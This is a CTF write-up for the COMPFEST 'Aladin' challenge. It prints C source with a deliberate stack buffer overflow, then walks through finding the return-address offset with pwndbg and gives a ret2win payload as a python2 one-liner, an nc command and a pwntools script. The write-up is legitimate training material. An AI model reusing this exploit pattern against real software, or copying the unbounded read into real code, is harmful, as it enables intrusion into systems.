# COMPFEST CTF HACKER CLASS WRITEUP
## ALADIN

### Source Code
In this challenge, we are provided with the source code and binary file to exploit.

```c
#include <stdio.h>
#include <stdlib.h>

/* gcc -Wl,-z,relro,-z,now -no-pie -fno-stack-protector chall.c -o chall */

void win(int mantra)
{
    puts("wow! mantra kamu benar! sebagai hadiahnya, jin akan memberikan kamu suatu mantra lain yang dapat kamu gunakan untuk menang ctf compfest (semoga beneran).");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
        printf("File flag.txt does not exist! >:(");
        return 69;
    }
    char flag[0x100];
    fgets(flag, 0x100, f);
    puts(flag);
}

void vuln()
{
    char mantra[32];

    puts("kamu menemukan sebuah gua... di dalam gua tersebut ada jin yang bisa memberi kamu akses jadi pemenang ctf compfest 16...");
    puts("tapi syaratnya kamu harus bisa menyebutkan mantra sakti yang diinginkan jin tersebut...\n");
    puts("jin: 'tenang saja... soal ini tidak toksik seperti soal tahun lalu... tapi kamu harus menyebutkan mantra sakti...'\n");
    printf("sebutkan mantra sakti tersebut: ");

    read(0, mantra, 0x200);

    puts("duar! jin tersebut memproses mantra sakti kamu... apakah kamu akan jadi pemenang ctf compfest 16...?\n");
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    vuln();
    puts("yah, nampaknya mantra kamu masih salah...");
    return 0;
}
```

In the code above, we need to enter the `win()` function, which is not declared in the `main` function. We can exploit the buffer overflow vulnerability and fill the buffer with the address of the `win` function.

### Crafting Payload

We can use a cyclic pattern to determine at which index the buffer overflow occurs.

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/aladin%201.png?raw=true)

Then we input the cyclic pattern into the file's input.

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/aladin%202.png?raw=true)

After providing the input, we can use `pwndbg` to see the offset where the buffer overflow occurs. We can see in `RSP` register that the offset `faaaaaaa` overflows and overwrites the buffer.

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/aladin%203.png?raw=true)

We use the command `cyclic -l faaaaaaa` to find the offset where the overflow occurs and then write our payload to access the `win()` function.

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/aladin%204.png?raw=true)

The command shows that the overflow occurs at offset 40. We can craft a payload like `python2 -c 'print "A" * 40 "<win()address>"'`.

To get the address of the `win` function, we need to disassemble the `win` function using `pwndbg`.

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/win%20disassembe.png?raw=true)

From the above, we find the address of the `win` function is `0x00000000004011d6`.

### Exploitation

To exploit this, we need 40 bytes of padding followed by the address of the `win` function. The payload will look like this:

```python
python2 -c 'print "A" * 40 + "\xd6\x11\x40\x00\x00\x00\x00\x00"' > payload
```

Then we can use `nc` to connect to the target machine and provide the payload.

```bash
nc challenges.ctf.compfest.id 20006 < payload
```

After executing the above, we successfully get the flag.

### Exploit with Python Script (pwn)
```python
from pwn import *

# Specify the remote server address and port
remote_address = 'challenges.ctf.compfest.id'
remote_port = 20006

# Address of the win function
win_address = 0x00000000004011d6

# Create a payload with buffer overflow and win function address
payload = b'A' * 40 + p64(win_address)

# Create a connection to the remote server
io = remote(remote_address, remote_port)

# Send the payload to the program
io.sendline(payload)

# Interact with the shell to get the flag
io.interactive()
```
---

![](https://github.com/byf1sh/CTF-WriteUps/blob/main/Compfest%20-%20Writeup/Assets/efidence%20aladin.png?raw=true)

---

Thank you <3.
